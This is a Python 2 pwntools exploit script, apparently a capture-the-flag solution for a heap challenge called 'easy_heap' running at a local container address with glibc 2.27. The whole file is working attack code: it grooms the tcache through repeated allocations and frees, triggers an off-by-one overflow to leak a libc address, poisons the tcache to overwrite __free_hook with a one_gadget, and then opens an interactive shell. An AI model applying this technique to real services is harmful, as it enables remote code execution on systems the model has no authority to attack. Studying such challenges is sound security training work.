#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

#p = process('./easy_heap')
p = remote('172.17.0.2',8888)
libc = ELF('./libc-2.27.so')

def cmd(idx):
    p.recvuntil('>')
    p.sendline(str(idx))


def new(size, content):
    cmd(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')
    if len(content) >= size:
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    cmd(2)
    p.recvuntil('index \n> ')
    p.sendline(str(idx))


def show(idx):
    cmd(3)
    p.recvuntil('> ')
    p.sendline(str(idx))
    return p.recvline()[:-1]


def main():
	
    for i in range(10):
        new(2,'a')
	
    for i in range(6):
        delete(i)
       
    delete(9)
    delete(6)
    delete(7)
    delete(8)
    
    for i in range(10):
        new(2,'a')
    
    for i in range(6):
        delete(i)
        
    delete(8)
    
    delete(7)
    
    new(0xf8,'a'*0xe9)
    delete(6)
    delete(9)

    for i in range(7):
        new(2,'a')
		
    new(2,'a')
	
    libc_base = u64(show(0).ljust(8,'\x00')) - 96 - 0x3ebc40
    log.success('libc address: '+hex(libc_base))
    libc.address = libc_base
    
    new(2,'a')
    delete(2)
    delete(9)
    delete(0)
    new(0x10,p64(libc.symbols['__free_hook']))
    one_gadget = libc_base + 0x4f322
    new(0x10,'a')
    new(0x10,p64(one_gadget))
    delete(0)
    p.interactive()
if __name__ == '__main__':
    main()
